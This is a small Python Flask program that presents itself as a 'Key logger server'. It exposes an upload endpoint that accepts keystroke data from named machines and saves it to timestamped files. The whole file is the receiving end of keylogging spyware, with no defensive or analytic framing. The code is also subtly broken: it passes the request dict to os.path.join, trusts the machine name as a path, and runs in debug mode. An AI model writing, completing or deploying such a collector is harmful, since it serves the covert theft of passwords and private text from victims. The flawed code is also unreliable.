from flask import Flask, request, jsonify
import time
import os

app = Flask(__name__)


@app.route("/")
def home():
    return "<h1>Key logger server is running</h1>"


def generate_log_filename():
    return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"


@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400
    machine = data["machine"]
    log_data = data["data"]

    machine_folder = os.path.join(data, machine)
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)

    filename = generate_log_filename()
    file_path = os.path.join(machine_folder, filename)

    with open(file_path, "w", encoding="utf-8") as f:
        f.write(log_data)

    return jsonify({"status": "success", "file": file_path}), 200


if __name__ == "__main__":
    app.run(debug=True)
